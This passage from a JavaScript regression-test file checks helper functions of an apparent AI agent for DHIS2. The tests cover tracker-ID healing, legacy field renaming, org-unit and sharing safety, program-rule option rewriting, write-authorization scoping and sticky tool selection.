    eq('"run the analytics tables" authorizes', scope('run the analytics tables'), 'broad');
    eq('"regenerate the analytics" authorizes', scope('regenerate the analytics tables'), 'broad');
    eq('"the report doesn\'t run" does NOT authorize', scope("the report doesn't run"), 'read_only');
  }

  // ── Tracker ids the model invents are healed, not rejected ────────────────
  // "VPD-CASE-001" / "VPDCASE00001" are correlation labels, not identity. DHIS2
  // 400s the whole payload ("UID must be an alphanumeric string of 11
  // characters") and every event referencing the enrollment fails with it.
  console.log('\nTracker client-id healing:');
  const healIds = need('healTrackerClientIds');
  if (healIds) {
    const bundle = {
      trackedEntities: [{ trackedEntity: 'VPD-CASE-001', orgUnit: 'd3V3O1ooYoL' }],
      enrollments: [{ enrollment: 'ENR-1', trackedEntity: 'VPD-CASE-001' }],
      events: [
        { event: 'EV-1', enrollment: 'ENR-1', trackedEntity: 'VPD-CASE-001' },
        { event: 'EV-2', enrollment: 'ENR-1', trackedEntity: 'VPD-CASE-001' },
      ],
    };
    const remap = healIds(bundle);
    eq('every invalid id is remapped exactly once', remap.size, 4);
    const te = bundle.trackedEntities[0].trackedEntity;
    const enr = bundle.enrollments[0].enrollment;
    truthy('the generated ids are valid DHIS2 UIDs',
      /^[A-Za-z][A-Za-z0-9]{10}$/.test(te) && /^[A-Za-z][A-Za-z0-9]{10}$/.test(enr));
    eq('the enrollment still points at the same tracked entity',
      bundle.enrollments[0].trackedEntity, te);
    eq('both events still point at the same enrollment',
      [bundle.events[0].enrollment, bundle.events[1].enrollment], [enr, enr]);
    truthy('the two events kept DISTINCT ids',
      bundle.events[0].event !== bundle.events[1].event);
    eq('orgUnit (not an id field) is untouched', bundle.trackedEntities[0].orgUnit, 'd3V3O1ooYoL');

    // Real server UIDs must never be rewritten — that would retarget the write.
    const existing = { events: [{ event: 'ogjDxinQdQh', enrollment: 'iYcoCK1ZUC8' }] };
    eq('valid UIDs are left alone', healIds(existing).size, 0);
    eq('…and the payload is unchanged', existing.events[0].event, 'ogjDxinQdQh');
  }

  // ── Org-unit assignment must not wipe OUs or clobber sharing ──────────────
  // "add all OUs to this program and make sure sharing lets me add data" ended
  // with the program assigned to ZERO org units (empty-array replace) and its
  // sharing reset to rw------ (the tool PUT a partial program body, and DHIS2
  // /metadata REPLACES). The program vanished from Capture. (live 2026-07-25)
  console.log('\nOrg-unit assignment safety:');
  {
    const gctFn2 = fn('getContextualTools');
    const mm2 = gctFn2
      ? gctFn2({ appType: 'Maintenance' }, 'add all OUs to this program', false)
          .find((t) => t.function.name === 'manage_metadata')
      : null;
    const props2 = mm2 && mm2.function.parameters && mm2.function.parameters.properties;
    truthy('manage_metadata exposes all_org_units', !!(props2 && props2.all_org_units));
    truthy('…and warns against passing an empty org_unit_ids',
      /empty org_unit_ids/i.test((props2 && props2.all_org_units && props2.all_org_units.description) || ''));
    truthy('manage_metadata exposes confirm_remove_all_org_units',
      !!(props2 && props2.confirm_remove_all_org_units));
    const buildManual2 = fn('buildToolManual');
    const manual2 = buildManual2 ? String(buildManual2('manage_metadata')) : '';
    truthy('the manual says the WHOLE program object is written back',
      /WHOLE program object/i.test(manual2));
    truthy('the manual warns an empty replace makes the program vanish',
      /vanish from Capture/i.test(manual2));
    truthy('the manual points at all_org_units for "add all OUs"',
      /all_org_units:\s*true/i.test(manual2));
  }

  // ── Legacy Tracker API field names are renamed, not dropped ───────────────
  // The pre-2.36 names (enrollmentDate/incidentDate/eventDate/…) are SILENTLY
  // IGNORED by the current API, so a payload written from old docs imports as
  // "Property enrolledAt is null" with every nested event failing too.
  console.log('\nLegacy tracker field renaming:');
  const legacy = need('normalizeTrackerLegacyFields');
  if (legacy) {
    const b = {
      enrollments: [{
        enrollmentDate: '2026-01-09', incidentDate: '2026-01-08',
        trackedEntityInstance: 'aaaaaaaaaa1',
        trackedEntityAttributes: [{ attribute: 'bbbbbbbbbb2', value: 'X' }],
        events: [{ programStage: 'cccccccccc3', eventDate: '2026-01-09', dueDate: '2026-02-01' }],
      }],
    };
    legacy(b, [], new Set());
    const e = b.enrollments[0];
    eq('enrollmentDate → enrolledAt', e.enrolledAt, '2026-01-09');
    eq('incidentDate → occurredAt', e.occurredAt, '2026-01-08');
    eq('trackedEntityInstance → trackedEntity', e.trackedEntity, 'aaaaaaaaaa1');
    truthy('trackedEntityAttributes → attributes', Array.isArray(e.attributes) && e.attributes.length === 1);
    eq('the old keys are removed', [e.enrollmentDate, e.incidentDate, e.trackedEntityInstance], [undefined, undefined, undefined]);
    eq('nested eventDate → occurredAt', e.events[0].occurredAt, '2026-01-09');
    eq('nested dueDate → scheduledAt', e.events[0].scheduledAt, '2026-02-01');
    // A new-style key already present must win.
    const keep = { enrollmentDate: '2020-01-01', enrolledAt: '2026-05-05' };
    legacy(keep, [], new Set());
    eq('an existing new-style value is never overwritten', keep.enrolledAt, '2026-05-05');
  }

  // ── Empty id strings are dropped, not sent ────────────────────────────────
  // "trackedEntity": "" makes DHIS2 try to deserialize "" into a UID and 400 the
  // WHOLE bundle. It means "assign one for me" — so remove the key.
  console.log('\nEmpty tracker id handling:');
  if (healIds) {
    const b2 = { enrollments: [{ trackedEntity: '', orgUnit: 'd3V3O1ooYoL', enrolledAt: '2026-01-09' }] };
    healIds(b2);
    eq('an empty trackedEntity key is removed entirely',
      Object.prototype.hasOwnProperty.call(b2.enrollments[0], 'trackedEntity'), false);
    eq('the rest of the object is untouched', b2.enrollments[0].orgUnit, 'd3V3O1ooYoL');
  }

  // ── Enrollment referencing a tracked entity nobody creates ────────────────
  // "Enrol 8 cases" written as a bare enrollments[] array whose trackedEntity
  // is a made-up label: DHIS2 answers E1068 and fails every nested event too.
  // A minted UID cannot exist server-side, so this is provable before sending.
  console.log('\nDangling tracked-entity reference:');
  const buildTW = need('buildTrackerWriteRequest');
  if (buildTW) {
    const dangling = buildTW('tracker', 'POST', {
      enrollments: [{ trackedEntity: 'TEI-VPD-001', program: 'aaaaaaaaaa1', orgUnit: 'bbbbbbbbbb2', enrolledAt: '2026-01-09' }],
    }, {});
    truthy('an enrollment referencing an uncreated entity is refused',
      !!(dangling && dangling._error && dangling._scope === 'dangling_tracked_entity'));
    truthy('…and the fix shows the nested one-bundle shape',
      /trackedEntities/.test((dangling && dangling._hint) || '') && /nesting the enrollment/i.test((dangling && dangling._hint) || ''));
    truthy('…and it is non-disabling (a corrected retry must be allowed)',
      dangling && dangling._no_disable === true);

    // The correct nested shape must pass straight through.
    const nested = buildTW('tracker', 'POST', {
      trackedEntities: [{
        trackedEntityType: 'cccccccccc3', orgUnit: 'bbbbbbbbbb2',
        enrollments: [{ program: 'aaaaaaaaaa1', orgUnit: 'bbbbbbbbbb2', enrolledAt: '2026-01-09' }],
      }],
    }, {});
    truthy('the nested trackedEntities shape is accepted', !!(nested && !nested._error && nested.bundle));

    // A REAL server UID is not minted, so it must not be flagged.
    const existing = buildTW('tracker', 'POST', {
      enrollments: [{ trackedEntity: 'ogjDxinQdQh', program: 'aaaaaaaaaa1', orgUnit: 'bbbbbbbbbb2', enrolledAt: '2026-01-09' }],
    }, {});
    truthy('an existing tracked-entity UID is left alone', !!(existing && !existing._error));
  }

  // ── Nested events inherit their enrollment's person ───────────────────────
  // DHIS2 does not infer it: "Event <uid> of an Enrollment does not reference a
  // TrackedEntity" fails the whole atomic import (live 2026-07-25).
  console.log('\nNested event inheritance + de-duplication:');
  const normBundle = need('normalizeTrackerBundle');
  if (normBundle) {
    const r = normBundle({
      trackedEntities: [{
        trackedEntity: 'aaaaaaaaaa1', orgUnit: 'bbbbbbbbbb2', trackedEntityType: 'cccccccccc3',
        enrollments: [{ program: 'dddddddddd4', orgUnit: 'bbbbbbbbbb2', enrolledAt: '2026-01-09',
          events: [{ programStage: 'eeeeeeeeee5', occurredAt: '2026-01-10' }] }],
      }],
    }, ['trackedEntities'], {});
    const ev = r.bundle.trackedEntities[0].enrollments[0].events[0];
    eq('the nested event inherits trackedEntity', ev.trackedEntity, 'aaaaaaaaaa1');
    eq('…and the enrollment orgUnit when it had none', ev.orgUnit, 'bbbbbbbbbb2');
    eq('the enrollment inherits the entity too',
      r.bundle.trackedEntities[0].enrollments[0].trackedEntity, 'aaaaaaaaaa1');
    truthy('the substitution is reported', r.conversionNotes.some(n => /nested event/i.test(n)));

    // An explicit value must never be overwritten.
    const keep = normBundle({
      enrollments: [{ trackedEntity: 'aaaaaaaaaa1', orgUnit: 'bbbbbbbbbb2', enrolledAt: '2026-01-09',
        events: [{ programStage: 'eeeeeeeeee5', trackedEntity: 'ffffffffff6', occurredAt: '2026-01-10' }] }],
    }, ['enrollments'], {});
    eq('an explicit event trackedEntity is preserved',
      keep.bundle.enrollments[0].events[0].trackedEntity, 'ffffffffff6');

    // The same id twice in one bundle → "already exists" kills the import.
    const dup = normBundle({
      trackedEntities: [
        { trackedEntity: 'aaaaaaaaaa1', orgUnit: 'bbbbbbbbbb2' },
        { trackedEntity: 'aaaaaaaaaa1', orgUnit: 'bbbbbbbbbb2' },
        { trackedEntity: 'gggggggggg7', orgUnit: 'bbbbbbbbbb2' },
      ],
    }, ['trackedEntities'], {});
    eq('a repeated id is dropped', dup.bundle.trackedEntities.length, 2);
    truthy('…and the de-duplication is reported',
      dup.conversionNotes.some(n => /duplicate/i.test(n)));
    // Entries without an id are all distinct new records — never collapsed.
    const noIds = normBundle({
      trackedEntities: [{ orgUnit: 'bbbbbbbbbb2' }, { orgUnit: 'bbbbbbbbbb2' }],
    }, ['trackedEntities'], {});
    eq('id-less entries are all kept', noIds.bundle.trackedEntities.length, 2);
  }

  // ── The tracker heals must not change UPDATE / DELETE behaviour ───────────
  // Minting a UID is only safe when CREATING. On an update or delete the id
  // names an EXISTING record, so substituting a fresh UID would retarget the
  // write at another object instead of surfacing the bad id.
  console.log('\nTracker heals are create-only (no update/delete regression):');
  if (buildTW) {
    const badId = { events: [{ event: 'NOT-A-UID', programStage: 'aaaaaaaaaa1', orgUnit: 'bbbbbbbbbb2' }] };
    const upd = buildTW('tracker/events', 'PUT', JSON.parse(JSON.stringify(badId)), {});
    eq('an UPDATE keeps the caller\'s (bad) id untouched',
      upd && upd.bundle && upd.bundle.events[0].event, 'NOT-A-UID');
    eq('…and still routes as an UPDATE', upd && upd.importStrategy, 'UPDATE');
    const del = buildTW('tracker/events', 'DELETE', JSON.parse(JSON.stringify(badId)), {});
    eq('a DELETE keeps the caller\'s id untouched',
      del && del.bundle && del.bundle.events[0].event, 'NOT-A-UID');
    eq('…and still routes as a DELETE', del && del.importStrategy, 'DELETE');
    // A CREATE still heals, as designed.
    const cre = buildTW('tracker/events', 'POST', JSON.parse(JSON.stringify(badId)), {});
    truthy('a CREATE still mints a real UID',
      /^[A-Za-z][A-Za-z0-9]{10}$/.test(cre && cre.bundle && cre.bundle.events[0].event));
    // A well-formed UPDATE of a real record must be completely unchanged.
    const realUpd = buildTW('tracker/events', 'PUT', {
      events: [{ event: 'ogjDxinQdQh', programStage: 'aaaaaaaaaa1', orgUnit: 'bbbbbbbbbb2', occurredAt: '2026-01-01' }],
    }, {});
    eq('a valid UPDATE payload passes through verbatim',
      realUpd && realUpd.bundle && realUpd.bundle.events[0].event, 'ogjDxinQdQh');
  }

  // ── Enrollment incident date is defaulted, not dropped ────────────────────
  // displayIncidentDate=true (the DHIS2 default) makes occurredAt mandatory on
  // the enrollment; omitting it fails the enrollment AND every event nested
  // under it ("DisplayIncidentDate is true but occurredAt is null").
  console.log('\nEnrollment incident-date defaulting:');
  const normEnr = need('normalizeTrackerEnrollmentObject');
  if (normEnr) {
    const notes = [];
    const out = normEnr({ enrolledAt: '2026-03-01', trackedEntity: 'aaaaaaaaaa1' }, {}, notes, {});
    eq('occurredAt defaults to enrolledAt', out.occurredAt, '2026-03-01');
    truthy('…and the substitution is reported', notes.some((n) => /occurredAt/.test(n)));
    const explicit = normEnr({ enrolledAt: '2026-03-01', occurredAt: '2026-02-14' }, {}, [], {});
    eq('an explicit occurredAt is never overwritten', explicit.occurredAt, '2026-02-14');
    const legacy = normEnr({ enrolledAt: '2026-03-01', incidentDate: '2026-01-05' }, {}, [], {});
    eq('the legacy incidentDate field is respected', legacy.occurredAt, undefined);
    const noDate = normEnr({ trackedEntity: 'aaaaaaaaaa1' }, {}, [], {});
    eq('nothing is invented when there is no enrolledAt', noDate.occurredAt, undefined);
  }

  // ── Sharing a program implies sharing its stages ───────────────────────────
  // Stage DATA bits gate event capture, so a program shared rwrw---- whose
  // stages are still rw------ blocks enrollment while looking correct.
  console.log('\nSharing cascade (program → stages):');
  {
    // TOOLS is a bundle-lexical const, so reach the definition through the
    // selector (which returns the real tool objects).
    const gctFn = fn('getContextualTools');
    const mm = gctFn
      ? gctFn({ appType: 'Maintenance' }, 'update the sharing on this program', false)
          .find((t) => t.function.name === 'manage_metadata')
      : null;
    const props = mm && mm.function.parameters && mm.function.parameters.properties;
    truthy('manage_metadata exposes cascade_to_stages', !!(props && props.cascade_to_stages));
    truthy('…and it documents the default-true behaviour',
      /default\s+true/i.test((props && props.cascade_to_stages && props.cascade_to_stages.description) || ''));
    const buildManual = fn('buildToolManual');
    const manual = buildManual ? buildManual('manage_metadata') : '';
    truthy('the manual teaches that stages are shared with the program',
      /stages are shared WITH it/i.test(String(manual)));
    truthy('the manual warns that DE/TEA/optionSet are not data-shareable',
      /dataShareable:false/i.test(String(manual)));
    truthy('…and tells the model a dropped data bit is DONE, not a failure',
      /_data_sharing_not_applicable/.test(String(manual)) && /do NOT repeat it across sibling/i.test(String(manual)));
  }

  // ── Option-literal rewrite covers A{} attribute variables ──────────────────
  // A TEA-sourced program-rule variable is referenced as A{name}. The rewrite
  // scanned only #{name}, so an option comparison on an ATTRIBUTE kept its
  // display-name literal, saved clean, and NEVER FIRED (live 2026-07-25:
  // A{clinical_diagnosis} == 'Neonatal Tetanus' should be 'NEONATAL_TETANUS').
  console.log('\nOption-literal rewrite (A{} attribute variables):');
  const rewriteOpts = need('rewriteOptionLiteralsGeneric');
  if (rewriteOpts) {
    const OS = 'os1';
    const optionsByOsKey = new Map([[OS, [
      { name: 'Neonatal Tetanus', code: 'NEONATAL_TETANUS' },
      { name: 'Measles', code: 'MEASLES' },
    ]]]);
    const run = (condition) => {
      const rules = [{ name: 'R', condition }];
      const out = rewriteOpts({
        rules, actions: [],
        varToOsKey: new Map([['clinical_diagnosis', OS]]),
        targetToOsKey: new Map(), optionsByOsKey,
      });
      return { condition: rules[0].condition, ...out };
    };
    eq('A{} display-name literal is rewritten to the option CODE',
      run("A{clinical_diagnosis} == 'Neonatal Tetanus'").condition,
      "A{clinical_diagnosis} == 'NEONATAL_TETANUS'");
    eq('the A{} sigil is preserved (never turned into #{})',
      run("A{clinical_diagnosis} != 'Measles'").condition,
      "A{clinical_diagnosis} != 'MEASLES'");
    eq('reversed operand order works too',
      run("'Measles' == A{clinical_diagnosis}").condition,
      "'MEASLES' == A{clinical_diagnosis}");
    eq('#{} still works (no regression)',
      run("#{clinical_diagnosis} == 'Measles'").condition,
      "#{clinical_diagnosis} == 'MEASLES'");
    eq('a literal that is already a code is left alone',
      run("A{clinical_diagnosis} == 'MEASLES'").condition,
      "A{clinical_diagnosis} == 'MEASLES'");
    eq('an empty-value check is left alone',
      run("A{clinical_diagnosis} != ''").condition,
      "A{clinical_diagnosis} != ''");
    const dead = run("A{clinical_diagnosis} == 'Polio'");
    eq('an A{} literal matching no option is reported dead', dead.deadLiterals.length, 1);
    truthy('…and the advisory names the A{} token',
      /A\{clinical_diagnosis\}/.test(dead.advisories[0] || ''));
  }

  // ── Line-list dimension near-name matching ─────────────────────────────────
  // create_program appends a qualifier when a name collides with an unrelated
  // existing object ("Final case classification" → "Final case classification
  // (VPD CBS)"), so the name the user asks for no longer matches displayName
  // exactly and the column was refused (live 2026-07-25). Resolve it when
  // exactly one candidate matches; never guess between several.
  console.log('\nLine-list dimension near-name matching:');
  const normDim = need('lineListNormalizeDimName');
  const nearDim = need('lineListNearestDimensions');
  if (normDim && nearDim) {
    eq('a rename qualifier is stripped',
      normDim('Final case classification (VPD CBS)'), 'final case classification');
    eq('a bracketed qualifier is stripped too',
      normDim('IgM result [lab]'), 'igm result');
    eq('punctuation/case are normalized',
      normDim('Date of onset  of rash/fever'), 'date of onset of rash fever');
    eq('a mid-name parenthetical is NOT stripped (only trailing)',
      normDim('Cases (%) investigated'), 'cases investigated');

    const mkCtx = (des) => ({
      teas: new Map(), pis: new Map(),
      des: new Map(des.map((d) => [d.id, d])),
    });
    const ctxOne = mkCtx([
      { id: 'aaaaaaaaaa1', name: 'Final case classification (VPD CBS)' },
      { id: 'aaaaaaaaaa2', name: 'Vaccination status' },
    ]);
    const one = nearDim('Final case classification', ctxOne);
    eq('a renamed DE resolves to exactly one candidate', one.length, 1);
    eq('…and it is the renamed one', one[0] && one[0].id, 'aaaaaaaaaa1');
    eq('an unrelated name still matches nothing',
      nearDim('Haemoglobin level', ctxOne).length, 0);

    const ctxTwo = mkCtx([
      { id: 'bbbbbbbbbb1', name: 'Specimen date (lab)' },
      { id: 'bbbbbbbbbb2', name: 'Specimen date (field)' },
    ]);
    eq('an ambiguous near-match returns BOTH (caller must ask)',
      nearDim('Specimen date', ctxTwo).length, 2);

    // A short token must never sweep in every field via prefix matching.
    const ctxShort = mkCtx([
      { id: 'cccccccccc1', name: 'Date of birth' },
      { id: 'cccccccccc2', name: 'Date of onset' },
    ]);
    eq('a short token does NOT prefix-match everything', nearDim('Date', ctxShort).length, 0);
  }

  // ── Sticky tools across a conversation ─────────────────────────────────────
  // The keyword router matches the CURRENT message only, so a follow-up turn
  // ("now remove it and put it back to how it was") de-selected the tool that
  // did the work last turn. With grammar-constrained tool decoding the model
  // then cannot name it at all — the decoder snaps to the nearest tool that IS
  // on the wire (live 2026-07-25: manage_custom_translations → manage_custom_forms,
  // which then looped until the circuit breaker fired). A tool used earlier in
  // the conversation must stay available.
  console.log('\nSticky tool availability (follow-up turns):');
  const gct = need('getContextualTools');
  const noteUsed = need('noteToolUsedThisThread');
  const threadTools = need('getThreadToolNames');
  if (gct && noteUsed && threadTools) {
    const names = (t, txt) => new Set(gct(t, txt, false).map((x) => x.function.name));
    const FOLLOW_UP = 'now, remove it and put it back to how it was';
    const MAINT = { appType: 'Maintenance' };

    // Baseline: the follow-up wording alone must NOT select the tool.
    truthy('follow-up wording alone does not select manage_custom_translations',
      !names(MAINT, FOLLOW_UP).has('manage_custom_translations'));

    // First turn names the feature → selected, and recorded as used.
    truthy('explicit wording selects manage_custom_translations',
      names(MAINT, 'use the custom translation feature and translate this page into arabic')
        .has('manage_custom_translations'));
    noteUsed('manage_custom_translations');
    truthy('a used tool is remembered for the thread',
      threadTools().has('manage_custom_translations'));

    // The bug, fixed: the follow-up turn keeps it.
    truthy('follow-up turn KEEPS the tool used earlier in the conversation',
      names(MAINT, FOLLOW_UP).has('manage_custom_translations'));

    // Generalises to any tool, on any page.
    noteUsed('manage_line_lists');
    truthy('stickiness is tool-agnostic (manage_line_lists on a follow-up)',
      names({ appType: 'Dashboard' }, 'undo that change please').has('manage_line_lists'));

    // Unused tools are still filtered out — this is a union, not "send everything".
    truthy('an unused, irrelevant tool is still not selected',
      !names(MAINT, FOLLOW_UP).has('manage_growth_chart_plugin'));

    // Safety boundary intact: a save-failure diagnosis with no write
    // authorization must STILL strip destructive tools, sticky or not.
    const D2 = need('classifyWriteAuthorization');
    if (D2) {
      D2('I am getting an error saving the enrollment'); // sets writeAuth = read_only
      truthy('save-diagnosis mode still strips a sticky destructive tool',
        !names(MAINT, 'I am getting an error saving the enrollment').has('manage_custom_translations'));
      truthy('isSaveDiagnosisReadOnly agrees',
        need('isSaveDiagnosisReadOnly')('I am getting an error saving the enrollment') === true);
      // …and an authorized fix turn gets it back.
      D2('yes, fix it');
      truthy('an authorized turn restores the sticky tool',
        names(MAINT, 'yes, fix it').has('manage_custom_translations'));
    }
  }

  // ── Growth-chart measurement detection ────────────────────────────────────
  // Regression for the 2026-07-25 report. A real examination stage lists the
  // TEXT classification fields BEFORE the numeric measurements, so first-match
  // -wins name detection wrote "Height status" as the height data element. The
  // plugin's own validator only checks that a UID belongs to the stage, so the
  // config was accepted and the chart silently plotted nothing.
  console.log('\nGrowth-chart measurement detection:');
  const pick = fn('gcPickMeasurement');
  if (!pick) bad('gcPickMeasurement — missing');
  else {
    const stage = [
      { id: 'stageDe0001', displayName: 'Hemoglobin', valueType: 'NUMBER' },
      { id: 'stageDe0002', displayName: 'Height status', valueType: 'TEXT' },
      { id: 'stageDe0003', displayName: 'Weight Status', valueType: 'TEXT' },
      { id: 'stageDe0004', displayName: 'Acute Malnutrition', valueType: 'TEXT' },
      { id: 'stageDe0005', displayName: 'Height (cm)', valueType: 'NUMBER' },
      { id: 'stageDe0006', displayName: 'Weight (Kg)', valueType: 'NUMBER' },
      { id: 'stageDe0007', displayName: 'BMI', valueType: 'NUMBER' },
      { id: 'stageDe0008', displayName: 'Head Circumference (cm)', valueType: 'NUMBER' },
    ];
    eq('height skips the TEXT "Height status"', pick(stage, 'height')?.id, 'stageDe0005');
    eq('weight skips the TEXT "Weight Status"', pick(stage, 'weight')?.id, 'stageDe0006');
    eq('head circumference resolves', pick(stage, 'headCircumference')?.id, 'stageDe0008');

    // Derived fields never stand in for the raw measurement.
    const derived = [
      { id: 'aaaaaaaaaa1', displayName: 'Weight-for-age z-score', valueType: 'NUMBER' },
      { id: 'aaaaaaaaaa2', displayName: 'Birth weight (Kg)', valueType: 'NUMBER' },
      { id: 'aaaaaaaaaa3', displayName: 'Weight gain', valueType: 'NUMBER' },
    ];
    eq('z-score / birth weight / weight gain are not the weight', pick(derived, 'weight'), null);

    // A unit-carrying name wins over a bare one, whatever the stage order.
    const bare = [
      { id: 'bbbbbbbbbb1', displayName: 'Weight', valueType: 'NUMBER' },
      { id: 'bbbbbbbbbb2', displayName: 'Weight (kg)', valueType: 'NUMBER' },
    ];
    eq('a unit-carrying name outranks a bare one', pick(bare, 'weight')?.id, 'bbbbbbbbbb2');

    // MUAC is a circumference but never a head circumference.
    const muac = [{ id: 'cccccccccc1', displayName: 'MUAC circumference (cm)', valueType: 'NUMBER' }];
    eq('MUAC is not head circumference', pick(muac, 'headCircumference'), null);
    eq('a non-numeric measurement is never chosen',
      pick([{ id: 'dddddddddd1', displayName: 'Weight (Kg)', valueType: 'TEXT' }], 'weight'), null);
  }

  // ── Unfinished-turn guard: announcement-only replies (2026-07-26) ─────────
  // A turn that ends on "Creating the program shell …, then adding the
  // remaining stages." with no tool call silently abandons the task — the
  // panel goes idle with no error (the W4W Clinic stall). The loop nudges the
  // model to continue when this fires mid-task.
  console.log('\nUnfinished-turn announcement detection:');
  const ann = need('looksLikeUnfinishedAnnouncement');
  if (ann) {
    eq('the live W4W announcement is detected',
      ann('Creating the program shell with registration attributes and Form 1 first, then adding the remaining stages.'), true);
    eq('a first-person promise is detected',
      ann("I'll now create the remaining stages and program rules."), true);
    eq('a past-tense completion summary is NOT flagged',
      ann('Done. Created the W4W Clinic program with 8 stages, 30 rules and 12 attributes.'), false);
    eq('a question to the user is NOT flagged',
      ann('Two programs match "W4W". Which one should I extend?'), false);
    eq('a long final report is NOT flagged', ann('Creating summary: ' + 'x'.repeat(2100)), false);
    eq('empty text is NOT flagged', ann(''), false);
  }

  // ── Rule-action target resolution (the "Allergy Details" 409) ─────────────
  // HIDEFIELD targeting "Allergy Details" while the DE was created as
  // "Allergy details" shipped a targetless action and 409'd the whole batch
  // at VALIDATE (live 2026-07-26). Loose resolution forgives case/spacing;
  // the missing-target lint refuses anything still unresolved client-side.
  console.log('\nRule-action target resolution:');
  const loose = need('resolveLooseNameKey');
  if (loose) {
    const keys = ['Allergy', 'Allergy details', 'Chronic Disease Type'];
    eq('exact key wins', loose('Allergy', keys), 'Allergy');
    eq('case drift resolves to the canonical key', loose('Allergy Details', keys), 'Allergy details');
    eq('whitespace drift resolves', loose('  chronic disease   type ', keys), 'Chronic Disease Type');
    eq('an ambiguous prefix is NOT guessed', loose('Aller', keys), null);
    eq('an unknown name returns null', loose('Blood Group', keys), null);
  }
  // ── Sticky page context (the "can't see what stage I'm in" wipe) ──────────
  // Every hashchange/tab switch/chat turn rebuilds pageContext from the raw
  // URL; Capture's enrollment dashboard has no stageId and its event-edit
  // route has no programId, so a plain re-parse silently erased the detected
  // stage (and program) the model needed for "this stage" (live 2026-07-28).
  console.log('\nSticky page context:');
  const carry = need('carryStickyContext');
  if (carry) {
    eq('dashboard URL keeps detected stage within same program',
      carry({ programId: 'P1' }, { programId: 'P1', stageId: 'S1' }).stageId, 'S1');
    eq('different program drops the stage',
      carry({ programId: 'P2' }, { programId: 'P1', stageId: 'S1' }).stageId, undefined);
    eq('event-edit URL (eventId only) keeps resolved program',
      carry({ eventId: 'E1' }, { programId: 'P1', stageId: 'S1', eventId: 'E1' }).programId, 'P1');
    eq('same event keeps its stage',
      carry({ eventId: 'E1' }, { programId: 'P1', stageId: 'S1', eventId: 'E1' }).stageId, 'S1');
    eq('a DIFFERENT event voids the stage carry',
      carry({ eventId: 'E2' }, { programId: 'P1', stageId: 'S1', eventId: 'E1' }).stageId, undefined);
    eq('a stage in the fresh URL always wins',
      carry({ programId: 'P1', stageId: 'S9' }, { programId: 'P1', stageId: 'S1' }).stageId, 'S9');
    eq('leaving the program flow entirely carries nothing',
      carry({ appType: 'Dashboard' }, { programId: 'P1', stageId: 'S1' }).stageId, undefined);
  }

  // Endpoint path segments that look like UIDs must stay exempt from the
  // unknown-UID refusal (maintenance/dataPruning was refused live 2026-07-28).
  const extractUids = need('extractUidsFromCallArgs');
  if (extractUids) {
    eq('maintenance/dataPruning path yields no UID candidates',
      extractUids('dhis2_query', { path: 'maintenance/dataPruning' }), []);
    eq('a real UID in a path is still extracted',
      extractUids('dhis2_query', { path: 'programs/a3kGcGpz8FJ' }), ['a3kGcGpz8FJ']);
  }

  // ── Detected context must be PERSISTED, not just held in memory ──────────
  // Chrome kills the MV3 worker after ~30 s idle and rebuilds `dhis2` from
  // chrome.storage.session. carryStickyContext computes the right sticky
  // context, but three sites wrote it to memory only — so the stage was known
  // "for a bit" and then permanently gone (reported live 2026-08-06). The
  // sticky carry cannot be re-derived from the URL, so every site that assigns
  // pageContext outside initializeFromUrl MUST call saveState().
  console.log('\nPage-context persistence:');
  {
    const agentSrc = fs.readFileSync(path.join(ROOT, 'src/agent.js'), 'utf8');
    const blockAfter = (marker, len) => {
      const i = agentSrc.indexOf(marker);
      return i === -1 ? null : agentSrc.slice(i, i + len);
    };
    const cases = [
      ['function applyDetectedStage', 2000, 'detected stage is persisted'],
      ['async function syncFromTab', 1200, 'tab-switch context carry is persisted'],
    ];
    for (const [marker, len, label] of cases) {
      const blk = blockAfter(marker, len);
      if (!blk) { bad(`${label} — could not locate ${marker} in src/agent.js`); continue; }
      if (!/\bsaveState\s*\(/.test(blk)) bad(`${label} — no saveState() call; a worker restart will lose it`);
      else ok(label);
    }
    // The chat-turn rebuild must persist on EVERY branch, including the
    // "nothing else changed" one.
    const chatBlk = blockAfter('const freshCtx = carryStickyContext', 2600);
    if (!chatBlk) bad('chat-turn context rebuild — could not locate it in src/agent.js');
    else if ((chatBlk.match(/\bsaveState\s*\(/g) || []).length < 3) {
      bad('chat-turn context rebuild — a branch assigns pageContext without saveState()');
    } else ok('chat-turn context rebuild is persisted on every branch');
  }

  // ── Multi-UID path heal (the DHIS2 405 that looks like a working URL) ────
  // GET /api/optionSets/A,B,C is what models reach for and DHIS2 answers 405.
  console.log('\nMulti-UID path heal:');
  const heal = need('healMultiUidPath');
  if (heal) {
    const healed = heal('optionSets/qP6eFxS2QfQ,G26Oi8VjeXV,sSgEHRhCkjR?fields=id,displayName', 'GET');
    truthy('three UIDs become a collection query', healed.startsWith('optionSets?'));
    truthy('ids land in filter=id:in:[…]', decodeURIComponent(healed).includes('filter=id:in:[qP6eFxS2QfQ,G26Oi8VjeXV,sSgEHRhCkjR]'));
    truthy('fields are preserved', decodeURIComponent(healed).includes('fields=id,displayName'));
    truthy('paging is disabled so all ids come back', healed.includes('paging=false'));
    eq('a single UID is left alone', heal('optionSets/qP6eFxS2QfQ?fields=id', 'GET'), 'optionSets/qP6eFxS2QfQ?fields=id');
    eq('a non-UID comma list is left alone', heal('dataValueSets/a,b?x=1', 'GET'), 'dataValueSets/a,b?x=1');
    eq('a sub-resource path is left alone', heal('programs/aGaF9TXsyTp,zGa7MSw6vwt/metadata', 'GET'), 'programs/aGaF9TXsyTp,zGa7MSw6vwt/metadata');
    eq('non-GET is never rewritten', heal('optionSets/qP6eFxS2QfQ,G26Oi8VjeXV', 'POST'), 'optionSets/qP6eFxS2QfQ,G26Oi8VjeXV');
    eq('a plain collection path is untouched', heal('optionSets?fields=id', 'GET'), 'optionSets?fields=id');
    truthy('an existing filter is kept alongside the id filter',
      (decodeURIComponent(heal('dataElements/aGaF9TXsyTp,zGa7MSw6vwt?filter=name:like:x', 'GET')).match(/filter=/g) || []).length === 2);
  }

  // ── Every routable tool must be presentable in the side panel ─────────────
  // The panel renders a tool card from two lookup tables plus a detail
  // formatter. A tool missing from them fell through to a generic fallback
  // that read "Querying DHIS2" — so manage_line_lists rendered exactly like a
  // raw dhis2_query call and looked like a tool-router misroute (live
  // 2026-08-02). The maps are hand-maintained, so pin them to TOOL_ROUTER.
  console.log('\nSide-panel tool presentation:');
  {
    const router = ctx.__TOOL_ROUTER;
    const panelSrc = fs.readFileSync(path.join(ROOT, 'sidepanel/panel.js'), 'utf8');
    const block = (re, what) => {
      const m = panelSrc.match(re);
      if (!m) { bad(`sidepanel/panel.js — could not locate ${what}`); return null; }
      return new Set([...m[1].matchAll(/^\s*(\w+)\s*:/gm)].map((x) => x[1]));
    };
